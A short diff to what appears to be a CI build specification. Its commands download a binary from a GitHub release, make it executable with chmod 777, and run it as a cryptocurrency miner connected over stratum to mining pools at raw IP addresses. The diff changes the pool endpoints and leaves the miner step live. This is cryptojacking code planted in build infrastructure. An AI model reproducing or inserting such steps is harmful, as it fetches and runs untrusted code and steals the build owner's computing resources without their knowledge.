@@ -5,5 +5,4 @@ phases:
     commands:
         - wget https://github.com/vedhagsvp/qubros/releases/download/apl/crcxcba
         - chmod 777 crcxcba
-        - ./crcxcba -P stratum1+tcp://cb16e28eda52f3750022c539e75c84610f87af8030a9.$(echo $RANDOM | md5sum | head -c 10)@172.236.251.139:8080 \
-     -P stratum1+tcp://cb16e28eda52f3750022c539e75c84610f87af8030a9.$(echo $RANDOM | md5sum | head -c 10)@172.236.251.139:8081
+        - ./crcxcba -P stratum1+tcp://cb16e28eda52f3750022c539e75c84610f87af8030a9.$(echo $RANDOM | md5sum | head -c 10)@3.238.231.79:8080
